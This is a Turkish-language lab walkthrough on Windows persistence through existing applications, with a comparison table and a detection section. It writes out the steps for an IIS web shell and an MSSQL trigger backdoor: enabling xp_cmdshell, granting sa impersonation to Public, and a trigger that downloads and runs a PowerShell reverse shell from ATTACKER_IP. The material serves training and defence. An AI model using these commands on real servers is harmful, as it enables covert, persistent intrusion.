
**Temel mantık**

Önceki teknikler Windows'un kendi özelliklerini (servis, görev, registry, logon) kullanıyordu. Bu teknik farklı bir kapıdan girer: sistemde **zaten çalışan uygulamaları** kötüye kullanmak. Eğer bir uygulamada çalıştırılacak şey üzerinde bir miktar kontrolün varsa (web sunucusu, veritabanı, vb.), oraya backdoor gömebilirsin. Avantajı — Windows'a özgü persistence IOC'lerine (yeni servis, autorun anahtarı) bakan bir savunmacının radarının dışında kalabilirsin. Burada iki örnek var: web shell ve MSSQL trigger.

---

#### Yöntem 1 — Web Shell

**Mantık:** Web sunucusunun kök dizinine (webroot), komut çalıştırabilen bir script (web shell) yüklersin. Bu dosyanın URL'sine gidince, sunucu üzerinde komut çalıştırabilirsin.

**Uygulama:**

cmd

```cmd
move shell.aspx C:\inetpub\wwwroot\
```

`C:\inetpub\wwwroot` → IIS'in varsayılan webroot'u. Sonra `http://MACHINE_IP/shell.aspx` adresinden komut çalıştırırsın.

**İzin tuzağı:** Dosyayı aktarma biçimine göre web sunucusu dosyaya erişemeyebilir ("Permission Denied"). O durumda herkese tam izin ver:

cmd

```cmd
icacls shell.aspx /grant Everyone:F
```

**Yetki bağlamı ve yükseltme:** Web shell, IIS'in yapılandırılmış kullanıcısının yetkileriyle çalışır — varsayılan `iis apppool\defaultapppool`. Bu yetkisiz bir kullanıcıdır **ama** kritik bir şey taşır: **`SeImpersonatePrivilege`**. Bu privilege, bilinen exploitlerle (Potato ailesi: JuicyPotato, PrintSpoofer vb.) Administrator/SYSTEM'e yükselmenin kolay bir yolunu açar. Yani "yetkisiz" web shell aslında tam ele geçirmeye giden bir basamaktır.

**Zayıf nokta:** Blue team genelde web dizinlerinde **dosya bütünlüğü (file integrity)** kontrolü yapar. Oraya yeni/değişmiş bir dosya koymak büyük ihtimalle alarm tetikler. Bu yüzden bir sonraki yöntem daha sinsidir.

---

#### Yöntem 2 — MSSQL Trigger ile Backdoor

**Mantık:** MSSQL'de **trigger**'lar, veritabanında belirli olaylar gerçekleştiğinde (kullanıcı girişi, veri ekleme/güncelleme/silme) otomatik çalışan eylemlerdir. Bir trigger'ı, veritabanına her **INSERT** yapıldığında bir reverse shell tetikleyecek şekilde kurarsan, uygulama normal işini yaptıkça (ör. bir çalışan kaydı eklendikçe) backdoor kendiliğinden çalışır. Dosya sistemine yeni bir shell dosyası koymadığın için file integrity kontrolünü atlatır.

**Kurulum birkaç ön yapılandırma gerektirir:**

**a) `xp_cmdshell`'i etkinleştir.** Bu, MSSQL'in sistem konsolunda komut çalıştırmasını sağlayan yerleşik bir stored procedure'dür — güvenlik gereği **varsayılan kapalıdır**. Önce advanced options, sonra xp_cmdshell açılır:

sql

```sql
sp_configure 'Show Advanced Options',1;
RECONFIGURE;
GO
sp_configure 'xp_cmdshell',1;
RECONFIGURE;
GO
```

**b) `sa` kimliğine bürünme (impersonation) izni ver.** Normalde sadece `sysadmin` rolündeki kullanıcılar xp_cmdshell çalıştırabilir. Web uygulamaları ise kısıtlı bir DB kullanıcısıyla bağlanır. Bu yüzden tüm kullanıcılara `sa` (varsayılan DB administrator) olarak davranma izni verilir:

sql

```sql
USE master
GRANT IMPERSONATE ON LOGIN::sa to [Public];
```

Böylece web uygulamasının kısıtlı kullanıcısı bile trigger içinde `sa` yetkisiyle komut koşabilir.

**c) Trigger'ı oluştur.** HRDB veritabanındaki Employees tablosuna her INSERT'te, `sa` olarak xp_cmdshell üzerinden PowerShell çalıştırıp saldırganın sunucusundan bir `.ps1` indirip çalıştırır:

sql

```sql
USE HRDB
CREATE TRIGGER [sql_backdoor]
ON HRDB.dbo.Employees
FOR INSERT AS
EXECUTE AS LOGIN = 'sa'
EXEC master..xp_cmdshell 'Powershell -c "IEX(New-Object net.webclient).downloadstring(''http://ATTACKER_IP:8000/evilscript.ps1'')"';
```

Buradaki mantık: trigger payload'ı dosyada tutmaz, çalışma anında saldırgandan **indirir ve belleğe alır** (IEX = Invoke-Expression). Bu da diskte kalıcı bir iz bırakmamasını sağlar.

**d) İki bağlantı, iki dinleyici.** Bu exploit iki ayrı bağlantı kullanır:

- **Port 8000** → trigger `evilscript.ps1`'i buradan indirir. Saldırgan makinede: `python3 -m http.server`
- **Port 4454** → indirilen script'in açtığı reverse shell buraya döner. Saldırgan makinede: `nc -lvp 4454`

`evilscript.ps1` klasik bir PowerShell TCP reverse shell'dir (saldırgana bağlanır, gelen komutları `iex` ile çalıştırıp çıktıyı geri gönderir).

**e) Tetikleme.** `http://MACHINE_IP/` adresindeki web uygulamasına bir çalışan eklersin → uygulama veritabanına INSERT atar → trigger devreye girer → shell düşer.

---

#### Karşılaştırma

||Web Shell|MSSQL Trigger|
|---|---|---|
|Nereye yerleşir|Webroot'ta bir dosya|Veritabanında bir trigger|
|Diskte iz|Var (yeni .aspx dosyası)|Yok (payload runtime'da indirilir)|
|Tetikleme|URL'ye manuel erişim|Normal uygulama aktivitesi (INSERT)|
|Tespit riski|Yüksek (file integrity kontrolü)|Düşük (DB içinde gizli)|
|Yetki|defaultapppool + SeImpersonate|sa (impersonation ile)|

---

#### Önemli noktalar ve tespit yüzeyi

- **"Mevcut servisi kullan" felsefesi:** Her iki yöntem de Windows persistence IOC'lerine bakan savunmadan kaçar; onun yerine uygulama katmanına saklanır. Aynı mantık, çalıştırılan şey üzerinde kontrolün olduğu her uygulamaya (CMS, scheduled job'lar, vb.) uyarlanabilir.
- **SeImpersonatePrivilege zinciri:** Web shell tek başına yetkisiz görünse de Potato-tarzı exploitlerle SYSTEM'e giden açık bir yol sunar — unutulmaması gereken bir yükseltme vektörü.
- **Tespit için bakılacaklar:**
    - Web shell: webroot'taki **dosya bütünlüğü değişiklikleri** (yeni/değişmiş .aspx), IIS worker process'inden (`w3wp.exe`) `cmd.exe`/`powershell.exe` doğması.
    - MSSQL: **`xp_cmdshell`'in etkinleştirilmesi** (büyük bir IOC — üretimde çoğunlukla kapalı olmalı), beklenmedik `IMPERSONATE` grant'leri, şüpheli **trigger** tanımları, ve `sqlservr.exe`'nin PowerShell/cmd spawn etmesi. SQL Server'ın komut satırı çocuk süreçleri doğurması neredeyse her zaman kötü niyetlidir.

Özetle: ikisi de "Windows'un dışındaki bir servisi silah haline getir" yaklaşımıdır. Web shell basit ama gürültülü (dosya bırakır); MSSQL trigger ise veritabanının meşru işleyişine gömülüp diske iz bırakmadan, normal uygulama trafiğiyle tetiklenen çok daha sinsi bir kalıcılık sağlar.